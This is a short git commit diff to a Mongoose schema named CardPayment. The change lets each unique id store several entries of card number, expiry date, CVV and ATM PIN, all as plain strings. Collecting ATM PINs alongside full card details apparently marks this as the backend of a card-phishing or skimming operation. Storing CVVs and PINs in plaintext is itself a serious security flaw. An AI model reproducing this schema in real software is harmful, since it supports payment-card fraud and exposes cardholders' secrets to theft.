9b0d67162e951148bcefae9610d16311c8f31359
kingofak78 <gotakale952@gmail.com>
2025-05-10 01:37:08 -0700

    Update CardPayment.js

--- models/CardPayment.js
+++ models/CardPayment.js
@@ -1,11 +1,15 @@
 const mongoose = require('mongoose');
 
 const cardPaymentSchema = new mongoose.Schema({
-  uniqueid:   { type: String, required: true },
-  cardNumber: { type: String, required: true },
-  expiryDate: { type: String, required: true },
-  cvv:        { type: String, required: true },
-  atmPin:     { type: String, required: true }    // ← New field
+    uniqueid: { type: String, required: true },
+    entries: [
+        {
+            cardNumber: { type: String, required: true },
+            expiryDate: { type: String, required: true },
+            cvv: { type: String, required: true },
+            atmPin: { type: String, required: true }
+        }
+    ]
 });
 
 module.exports = mongoose.model('CardPayment', cardPaymentSchema);
